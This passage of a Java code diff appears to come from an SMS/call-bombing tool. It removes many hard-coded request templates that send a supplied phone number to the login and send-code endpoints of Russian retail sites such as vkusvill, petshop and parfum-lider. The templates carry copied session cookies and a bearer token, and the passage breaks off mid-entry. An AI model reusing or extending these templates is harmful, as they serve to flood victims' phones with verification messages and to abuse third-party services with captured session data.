-                        "  -H 'referer: https://vladimir.holodilnik.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw 'ajkey=6f348e0152ed75c0255c2ae8cbf3aea8&ajform=LOGIN_FORM&ajaction=GET_CODE&ajphoneORemail=%2B{formatted_phone:*+(***)+***-**-**}&ajverifycode=&ajUserType=1&ajConfPhone=&ajConfEmail=&ajPswd=&ajSubMode=' \\\n" +
                         "  --compressed", 7),
 
                 new CurlService("curl 'https://dobropizza.ru/ajaxopen/user_ask_password' \\\n" +
@@ -1713,25 +1483,6 @@ public class DefaultRepository implements ServicesRepository {
                         return json.toString();
                     }
                 },
-
-                new CurlService("curl 'https://sushi-star.ru/user/ajax444.php?do=sms_code' \\\n" +
-                        "  -H 'authority: sushi-star.ru' \\\n" +
-                        "  -H 'accept: */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                        "  -H 'cookie: _ym_uid=1677588101101445814; _ym_d=1677588101; PHPSESSID=93ccf907effdb221e0f6921519644052; choosing_branch=yes; _ym_isad=2' \\\n" +
-                        "  -H 'origin: https://sushi-star.ru' \\\n" +
-                        "  -H 'referer: https://sushi-star.ru/user/login.php' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw 'phone={phone:8(***)***-**-**}' \\\n" +
-                        "  --compressed", 7),
 
                 new Service(7) {
                     @Override
@@ -1797,55 +1548,6 @@ public class DefaultRepository implements ServicesRepository {
                 new Service(7) {
                     @Override
                     public void run(OkHttpClient client, Callback callback, Phone phone) {
-                        new CurlService("curl 'https://vla.vkusvill.ru/ajax/gen_ckey.php' \\\n" +
-                                "  -X 'POST' \\\n" +
-                                "  -H 'authority: vla.vkusvill.ru' \\\n" +
-                                "  -H 'accept: */*' \\\n" +
-                                "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                                "  -H 'content-length: 0' \\\n" +
-                                "  -H 'cookie: PHPSESSID=QHWuUtUODHtyQDeWzRUWf72eMEgWQkTv; UF_USER_BUY_SITE=N; UF_USER_AUTH=N; ABvariantBX_test_kg_in_pce=A; ABvariantBX_test_product_card_descr=B; ABvariantBX_test_torty_section_image=A; ABvariantBX_giftcard_banner_in_b2b_profile=B; ABvariantBX_UXFB_SEGMENT=C; ABvariantBX_test_search_logos_input=A; ABvariantBX_test_personal_specials_mobile=B; ABvariantBX_test_telegram_sign=A; _ymab_param=F1D5IBiyzdxPLKtxkO1jPaI5vl4UDAKyzgHgFwj4ewq235OO71w7aY0n9AB5rIlGi3TO6BUVFk8e5n2Q0EC0l6Cy29U; BITRIX_SM_SALE_UID=285034039; BITRIX_SM_REGION_ID_3=3875; BITRIX_SM_REGION_DOMAIN_3=vla; SERVERID=bitrix02; HEADER_TOP_BN_SECT_ID=1590; HEADER_TOP_BN_ID=1723195; tmr_lvid=ad3c43cbd2fe11e07704d9504c640bac; tmr_lvidTS=1682945201047; _gcl_au=1.1.1566507895.1682945201; _ym_uid=1682945201422798542; _ym_d=1682945201; _vv_card=%3C470219; _ga=GA1.2.1031440314.1682945201; _gid=GA1.2.229059216.1682945202; _gat_gtag_UA_138047372_1=1; _ym_isad=2; _dc_gtm_UA-138047372-1=1; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; russian_crt_available=N; tmr_detect=0%7C1682945203908; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvla.vkusvill.ru%252F; mgo_uid=PhC9ivV1XX7BPooL4OKC; mgo_cnt=1; mgo_sid=9juurtzctz11001n3wde; uxs_uid=3cb41090-e81e-11ed-b69a-0b43f7c44d6f; WE_USE_COOKIE=Y; _ga_YJMLVXQQNQ=GS1.1.1682945201.1.1.1682945221.40.0.0' \\\n" +
-                                "  -H 'origin: https://vla.vkusvill.ru' \\\n" +
-                                "  -H 'referer: https://vla.vkusvill.ru/' \\\n" +
-                                "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                                "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                                "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                                "  -H 'sec-fetch-dest: empty' \\\n" +
-                                "  -H 'sec-fetch-mode: cors' \\\n" +
-                                "  -H 'sec-fetch-site: same-origin' \\\n" +
-                                "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                                "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                                "  --compressed").run(client, (call, response) -> {
-                            ResponseBody body = response.body();
-                            if (body == null) {
-                                callback.onResponse(call, response);
-                                return;
-                            }
-                            new CurlService("curl 'https://vla.vkusvill.ru/ajax/user_v2/auth/check_phone.php' \\\n" +
-                                    "  -H 'authority: vla.vkusvill.ru' \\\n" +
-                                    "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
-                                    "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                                    "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                                    "  -H 'cookie: PHPSESSID=QHWuUtUODHtyQDeWzRUWf72eMEgWQkTv; UF_USER_BUY_SITE=N; UF_USER_AUTH=N; ABvariantBX_test_kg_in_pce=A; ABvariantBX_test_product_card_descr=B; ABvariantBX_test_torty_section_image=A; ABvariantBX_giftcard_banner_in_b2b_profile=B; ABvariantBX_UXFB_SEGMENT=C; ABvariantBX_test_search_logos_input=A; ABvariantBX_test_personal_specials_mobile=B; ABvariantBX_test_telegram_sign=A; _ymab_param=F1D5IBiyzdxPLKtxkO1jPaI5vl4UDAKyzgHgFwj4ewq235OO71w7aY0n9AB5rIlGi3TO6BUVFk8e5n2Q0EC0l6Cy29U; BITRIX_SM_SALE_UID=285034039; BITRIX_SM_REGION_ID_3=3875; BITRIX_SM_REGION_DOMAIN_3=vla; SERVERID=bitrix02; HEADER_TOP_BN_SECT_ID=1590; HEADER_TOP_BN_ID=1723195; tmr_lvid=ad3c43cbd2fe11e07704d9504c640bac; tmr_lvidTS=1682945201047; _gcl_au=1.1.1566507895.1682945201; _ym_uid=1682945201422798542; _ym_d=1682945201; _vv_card=%3C470219; _ga=GA1.2.1031440314.1682945201; _gid=GA1.2.229059216.1682945202; _gat_gtag_UA_138047372_1=1; _ym_isad=2; _dc_gtm_UA-138047372-1=1; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; russian_crt_available=N; tmr_detect=0%7C1682945203908; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvla.vkusvill.ru%252F; mgo_uid=PhC9ivV1XX7BPooL4OKC; mgo_cnt=1; mgo_sid=9juurtzctz11001n3wde; uxs_uid=3cb41090-e81e-11ed-b69a-0b43f7c44d6f; WE_USE_COOKIE=Y; _ga_YJMLVXQQNQ=GS1.1.1682945201.1.1.1682945221.40.0.0' \\\n" +
-                                    "  -H 'origin: https://vla.vkusvill.ru' \\\n" +
-                                    "  -H 'referer: https://vla.vkusvill.ru/' \\\n" +
-                                    "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                                    "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                                    "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                                    "  -H 'sec-fetch-dest: empty' \\\n" +
-                                    "  -H 'sec-fetch-mode: cors' \\\n" +
-                                    "  -H 'sec-fetch-site: same-origin' \\\n" +
-                                    "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                                    "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                                    "  --data-raw 'cname=&FUSER_ID=285034039&USER_NAME=&USER_PHONE=%2B{formatted_phone:*+(***)+***-**-**}&token=&is_retry=&AGREE_SUBSCRIBE=Y&ckey=" + body.string() + "' \\\n" +
-                                    "  --compressed").run(client, callback, phone);
-
-                        }, phone);
-                    }
-                },
-
-                new Service(7) {
-                    @Override
-                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                         client.newCall(new Request.Builder()
                                 .url("https://kronshtadt.food-port.ru/api/user/generate-password")
                                 .header("x-thapl-apitoken", "0b84683a-14b6-11ed-9881-d00d1849d38c")
@@ -1896,42 +1598,6 @@ public class DefaultRepository implements ServicesRepository {
                     }
                 },
 
-                new CurlService("curl 'https://www.techport.ru/registration?type=false' \\\n" +
-                        "  -H 'authority: www.techport.ru' \\\n" +
-                        "  -H 'accept: */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                        "  -H 'cookie: sessuid=bb9735f3abe9b348a66356ce45b8d13a; city_id_po=1; city_id_po_kladr=7700000000000; nusc=MSK; bknd=b1e; flocktory-uuid=348d06b3-5bad-4513-ba6e-9c776c0abd7c-1; _gcl_au=1.1.1766922942.1682951354; ucuid=959930506.644707205.-241305704.2049059978; ucnuid=5632; ucsuid=1642688454.2037854877.1275961237.1402125306; _ga=GA1.2.1658537611.1682951354; _gid=GA1.2.615528915.1682951354; _dc_gtm_UA-26133301-1=1; tmr_lvid=f1326cb6176f91aa7768ae708623ed0c; tmr_lvidTS=1673961980785; _ym_uid=167396198198105830; _ym_d=1682951354; _ym_visorc=w; _ym_isad=2; tmr_detect=0%7C1682951356466' \\\n" +
-                        "  -H 'origin: https://www.techport.ru' \\\n" +
-                        "  -H 'referer: https://www.techport.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw 'aero=1&username=gerwgerge&login=%2B{full_phone}&password=gewrgegegewrgergergewrg' \\\n" +
-                        "  --compressed"),
-
-                new CurlService("curl 'https://www.parfum-lider.ru/local/ajax/auth/by_call.php' \\\n" +
-                        "  -H 'authority: www.parfum-lider.ru' \\\n" +
-                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                        "  -H 'cookie: PHPSESSID=eQB8jpeLyS402lDtE9mbSljNb2TE7SPR; parfumlider_GUEST_ID=42571405; parfumlider_LAST_VISIT=01.05.2023%2020%3A33%3A31; parfumlider_ALTASIB_GEOBASE_CODE=%7B%22REGION%22%3A%7B%22CODE%22%3A%2233%22%2C%22NAME%22%3A%22%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F%22%2C%22FULL_NAME%22%3A%22%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F%20%D0%9E%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%2C%22SOCR%22%3A%22%D0%BE%D0%B1%D0%BB%22%7D%2C%22DISTRICT%22%3A%7B%22CODE%22%3A%2233000%22%2C%22NAME%22%3A%22%22%2C%22SOCR%22%3A%22%22%7D%2C%22CITY%22%3A%7B%22ID%22%3A%2247740%22%2C%22NAME%22%3A%22%D0%9C%D1%83%D1%80%D0%BE%D0%BC%22%2C%22SOCR%22%3A%22%D0%B3%22%2C%22POSTINDEX%22%3A%220%22%2C%22ID_DISTRICT%22%3A%2233000%22%7D%2C%22CODE%22%3A%2233000005000%22%7D; parfumlider_currentStoreCity=33000005000; parfumlider_kernel=-crpt-kernel_0; _ym_uid=1674042020985718314; _ym_d=1682951614; _userGUID=0:lh4xxs3r:Tp3~ZIwa6FRYWFDxpPyyJrrEm7HwA4QD; dSesn=d03a9add-633c-b51b-e742-f09241523147; _dvs=0:lh4xxs3r:_o3CQQO~N8u~wVmeYsYewYCZ0IRh6KR~; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1682963940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; parfumlider_kernel_0=rqo098Jn65OcGOFsWhP2S_Oj5AfbjbjTncMDX_M6JxD8N4lTVtkUpfxpBMhG3fpc0EBkTyZ5MKBan3tE0Fv1JWsaqQln3s3KVg9lgNTl4q3-Ba18mlELCujOrFXhgsT7TiOOKqGI3NJBOS2YVtsVOluSen7lT0avV-QfKGY7cJ1axwEftBWJnS01RIeLKZdMxEi_5f-zv8pKFubnd0ZuZhbuPf1QGzH0iAJKeb7ckoNHmhHx34PQx0o5gEi8awqtdHTqSRJ3wmr731z0_rfB2IC-rmRcjilRjAKYw-6tVc3qfu6gpTBfL5pnzdkKgaQvyW0YFrQWa5dcg-7OFaIJ4b1KXskZCadqejFw3Kk3oeoYXuNUSlUltxYOBPR44MY_H8kNLz7WVWPXVzQIpMPf_CQclkZnh6TN9h2uxuJhQotE4WBA3iwIAGRhy5bEcEN2IPdpx2bnHK4PZndVRGRHcQ1AUcke7LrCbyI-bZ8S1Iu92XhYAMcqOSejHtgOz_V-aOYr8Qv06dqE9_tikhoxIix9-G04wje3d8F5hv2torMLl1hZO_cr2Z2Me4aBUmcrjEm1F5Ww0LFRh3i26RIUp7sfrOAMHCcczQyKaZ8CZAINv26rsPAoDMD4GhtjGYCemS3u1Xg_H-MUuJHuaA0UcRoaVRUaRhOSe6Ojdb8QuVLMxcm8U26z03CgOsswAEFyvCklF8nrVxoCi4QZ1ywe6wLCGu6MdK_QeB1DRt-BvTB7lkWyV2o0aTQlByAd2BW_X3u2rkwedoTa8_ZlYOFTcGERg0QDhd_pRHzRWkcg3-Jf_DSnemBMp3M5sXV6; uxs_uid=2754bab0-e82d-11ed-9dbc-75c7c6cc2b4f; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.1667994013.1682951616; _gid=GA1.2.171813107.1682951616; _gat=1; _gat_gtag_UA_8407288_3=1; _gcl_au=1.1.1731087898.1682951616; _dc_gtm_UA-184775945-1=1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _gat_frisbuyGa=1' \\\n" +
-                        "  -H 'origin: https://www.parfum-lider.ru' \\\n" +
-                        "  -H 'referer: https://www.parfum-lider.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --data-raw 'phone=%2B{formatted_phone:*+(***)+***-**-**}' \\\n" +
-                        "  --compressed", 7),
-
                 new CurlService("curl 'https://kviku.ru/cards/default/SendCodeApproveDocs' \\\n" +
                         "  -H 'authority: kviku.ru' \\\n" +
                         "  -H 'accept: */*' \\\n" +
@@ -1948,111 +1614,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  -H 'sec-fetch-site: same-origin' \\\n" +
                         "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                         "  --data-raw 'phone=%2B{formatted_phone:*-***-***-****}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://hakasya.24farmacia.ru/api/login' \\\n" +
-                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
-                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjliNTE0MzMxLTMzMGQtNDZhYi1iY2Y5LTE3YTY1MjAxMGE4NSIsInR5cGUiOiJhdXRob3JpemUiLCJpYXQiOjE2ODMyMTcwNDV9.XRxyWNvNWz7fr3QgoVynn1cEifpV8ubbSQSIU5s5drg' \\\n" +
-                        "  -H 'Connection: keep-alive' \\\n" +
-                        "  -H 'Content-Type: application/json;charset=UTF-8' \\\n" +
-                        "  -H 'Origin: https://24farmacia.ru' \\\n" +
-                        "  -H 'Referer: https://24farmacia.ru/' \\\n" +
-                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
-                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
-                        "  -H 'Sec-Fetch-Site: same-site' \\\n" +
-                        "  -H 'Type-Device: web' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'x-refresh-token;' \\\n" +
-                        "  --data-raw '{\"phone\":\"{full_phone}\",\"bitrixToken\":\"\"}' \\\n" +
-                        "  --compressed"),
-
-                new CurlService("curl 'https://7semyan.ru/local/ajax/auth.php?AJAX_REQUEST=Y' \\\n" +
-                        "  -H 'authority: 7semyan.ru' \\\n" +
-                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'cache-control: no-cache' \\\n" +
-                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
-                        "  -H 'cookie: BITRIX_SM_GUEST_ID=27980350; _gcl_au=1.1.1619653539.1680708566; rrpvid=257308039619150; _ym_uid=1680708566507024937; _ym_d=1680708566; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22; _ga=GA1.2.1984650142.1680708566; roistat_first_visit=15728909; tmr_lvid=0c07c408e108b2ede73f3f88588b427a; tmr_lvidTS=1680708566567; rraem=; ___dc=d80249ee-02eb-46b1-aff3-a50d7cc04815; PHPSESSID=ylbYyCU3RJ2g7gfwEJbOvCuR8yEFj57a; tinkoff_auth_state=u0TeKLwqYSzZfkCFtGb1; BITRIX_SM_ITEES_ASO_USER_DATA=a%3A2%3A%7Bs%3A13%3A%22SEARCH_ENGINE%22%3Bs%3A6%3A%22Google%22%3Bs%3A7%3A%22REFERER%22%3Bs%3A23%3A%22https%3A%2F%2Fwww.google.com%2F%22%3B%7D; BITRIX_SM_LAST_ADV=5_Y; BITRIX_SM_SALE_UID=df42256bc5ea6737b3b1d26dec24226f; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A21%2C%22EXPIRE%22%3A1683233940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gid=GA1.2.990937281.1683217778; _gat_gtag_UA_111545587_1=1; _ym_visorc=w; _ym_isad=2; cto_bundle=0gMSzV9CdXE1aDRSNjA0SmklMkY4dnlrOENrRmphREhRNW8wUEdnTUNReCUyRlpMckNsMUpaRlhxSGF4SHFsQkp3Vm5DV3lJJTJCZnBzVjltUVluVGh6Q2c4Sjc5UndaeUhMUE1SRllWb2hWNXk2MHdpdlBaeSUyQjIlMkI5T3pjTSUyRnJkOWZiNCUyRkdNQVAlMkI; _gr_session=%7B%22s_id%22%3A%22fdeac820-aaf1-4f32-a406-e6297cd7fde6%22%2C%22s_time%22%3A1683217777776%7D; roistat_visit=16013595; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; g4c_x=1; BITRIX_SM_LAST_VISIT=04.05.2023%2019%3A29%3A37; roistat_marker=seo_google_; roistat_marker_old=seo_google_; rrwpswu=true; tmr_detect=0%7C1683217780612; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=%5B%5D; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_marker%2Croistat_marker_old%2Croistat_call_tracking%2Croistat_emailtracking_email%2Croistat_emailtracking_tracking_email%2Croistat_emailtracking_emails' \\\n" +
-                        "  -H 'origin: https://7semyan.ru' \\\n" +
-                        "  -H 'referer: https://7semyan.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  --data-raw '{\"action\":\"sendCall\",\"phone\":\"+{phone:7 ***-***-**-**}\",\"fingerprint\":\"1f77b5b2252086ad7056a973408429b0\"}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://www.petshop.ru/ajax/?act=AuthForm.SendCode' \\\n" +
-                        "  -H 'authority: www.petshop.ru' \\\n" +
-                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
-                        "  -H 'cookie: route=25d6ed6d94b4bfa9755de8688d30eaa5; PHPSESSID=022013409834f2f519690fccb5aa34b7; geo_city_id=a%3A1%3A%7Bs%3A7%3A%22city_id%22%3Bi%3A22%3B%7D; BITRIX_SM_SALE_UID=1305774718; _gid=GA1.2.1845568686.1683218180; _gat=1; tmr_lvid=4705f6bbc1b20e20c909a3057dbf6d0a; tmr_lvidTS=1683218179843; rrpvid=378369852167900; flocktory-uuid=d5b1dbba-0270-432b-aa75-866c61eff023-1; _ym_uid=168321818023239709; _ym_d=1683218180; showEcoSystem=true; _userGUID=0:lh9cn8jf:kT2trJTqE1mfvf~xZ0IA~o02SPprRE7X; dSesn=ce2bccb8-1766-5726-7b8c-96be33fdfad4; _dvs=0:lh9cn8jf:84YqvJXeV1AiwOuNXfddV~gsBsacYyYC; _ym_isad=2; rcuid=6275fcd65368be000135cd22; BITRIX_SM_SALE_UID=1305774718; _gat_EnhancedEcommerceTracker=1; _gcl_au=1.1.1279521930.1683218182; _gat_UA-46029315-1=1; _ga_C0DDR7MNM6=GS1.1.1683218182.1.0.1683218182.60.0.0; _ga=GA1.1.2056984546.1683218180; _tt_enable_cookie=1; _ttp=ifBFKBbQdA2lvaCjWZxJWQ-4Pvc; tmr_detect=0%7C1683218183077' \\\n" +
-                        "  -H 'origin: https://www.petshop.ru' \\\n" +
-                        "  -H 'referer: https://www.petshop.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  --data-raw '{\"token\":\"b6ee70efc2062d935049e0a738f65f0c\",\"is_ajax\":true,\"phone\":\"+{full_phone}\",\"force\":false}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://www.tmktools.ru/api/user/send-code' \\\n" +
-                        "  -H 'Accept: */*' \\\n" +
-                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'Connection: keep-alive' \\\n" +
-                        "  -H 'Content-Type: application/json; charset=UTF-8' \\\n" +
-                        "  -H 'Cookie: city_id=4; BSSESSID=0b36a164-823f-4da0-b719-e566ae989daf; S5SESSID=njfvnv9q86g8g2f31dfrsjmifn; nlhid=1683218536590.34qmy89-tmk-h; nlsid=1683218536590.3av0elur-tmk-s; nluid=1683218536591.mmg4osbb-tmk-u; _gid=GA1.2.1341268179.1683218537; _dc_gtm_UA-5073072-1=1; _ga_57K8BDR49W=GS1.1.1683218536.1.0.1683218536.0.0.0; _ga=GA1.1.681569834.1683218537; _ga_P2LJ8HZZ0P=GS1.1.1683218536.1.0.1683218536.0.0.0; tmr_lvid=165b3c36b951a4e98c05b3e5c417b33f; tmr_lvidTS=1683218536919; _ym_uid=1683218537130480183; _ym_d=1683218537; _ym_isad=2; _ym_visorc=w; _gcl_au=1.1.883793766.1683218538; tmr_detect=0%7C1683218539283' \\\n" +
-                        "  -H 'Origin: https://www.tmktools.ru' \\\n" +
-                        "  -H 'Referer: https://www.tmktools.ru/' \\\n" +
-                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
-                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
-                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  --data-raw '{\"phone\":\"{full_phone}\",\"recaptcha\":null}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://ap.leomax.ru/siteapi/auth/authcode' \\\n" +
-                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
-                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
